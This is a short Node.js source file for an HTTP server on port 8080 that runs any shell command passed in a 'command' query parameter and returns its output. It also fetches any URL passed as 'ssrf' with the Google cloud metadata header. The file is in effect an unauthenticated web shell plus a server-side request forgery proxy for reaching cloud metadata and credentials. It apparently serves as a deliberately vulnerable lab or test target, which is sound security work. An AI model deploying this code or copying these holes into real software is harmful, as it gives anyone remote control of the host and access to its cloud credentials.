var http = require('http'); // 1 - Import Node.js core module
const { exec } = require("child_process");
const url = require('url');
const axios = require('axios')

http.createServer(function (req, res) {
  const queryObject = url.parse(req.url,true).query;
  console.log(queryObject);
  var response = ':(';

  var command = queryObject['command'];
  var ssrf = queryObject['ssrf'];
        if(command){
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.log(`error: ${error.message}`);
                    response = error.message;
                }
                else if (stderr) {
                    console.log(`stderr: ${stderr}`);
                    response=stderr;
                }
                else
                    response = stdout;
                res.writeHead(200, {'Content-Type': 'text/html'});
                res.end(response.toString());              
                console.log(response);
            });
        }
        else if(ssrf){
            axios.get(ssrf, {headers: {'Metadata-Flavor': 'Google'}}, { transformResponse: (r) => r }).then((r) =>{
                res.end(JSON.stringify(r.data));        
            }, (error) => {
                res.writeHead(200, {'Content-Type': 'text/html'});
                res.end(error.toString());        
            });
        }
        else{
            res.writeHead(200, {'Content-Type': 'text/html'});
            res.end(response);
        }
}).listen(8080);
